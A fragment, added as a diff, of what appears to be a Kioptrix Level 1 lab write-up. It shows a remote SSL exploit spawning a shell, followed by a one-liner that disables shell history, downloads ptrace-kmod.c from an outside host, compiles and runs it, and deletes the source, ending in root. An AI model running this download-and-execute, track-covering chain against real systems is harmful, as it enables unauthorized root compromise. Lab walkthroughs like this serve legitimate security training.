+  *******************************************************************
+
+  Establishing SSL connection
+  cipher: 0x4043808c   ciphers: 0x80f8068
+  Ready to send shellcode
+  Spawning shell...
+  bash: no job control in this shell
+  bash-2.05$ 
+  bash-2.05$ unset HISTFILE; cd /tmp; wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; 
+  --21:53:33--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+             => `ptrace-kmod.c'
+  Connecting to dl.packetstormsecurity.net:443... connected!
+  HTTP request sent, awaiting response... 200 OK
+  Length: 3,921 [text/x-csrc]
+
+      0K ...                                                   100% @   1.25 MB/s
+
+  21:53:34 (765.82 KB/s) - `ptrace-kmod.c' saved [3921/3921]
+
+  [+] Attached to 986
+  [+] Waiting for signal
+  [+] Signal caught
+  [+] Shellcode placed at 0x4001189d
+  [+] Now wait for suid shell...
+  id
+  uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+  uname -a
+  Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
+  hostname
+  kioptrix.level1
+  ls -l
+  total 21
+  -rwsr-sr-x    1 root     root        19920 Jun 26 21:53 p
+  rm p
+
+And so we have root.
+
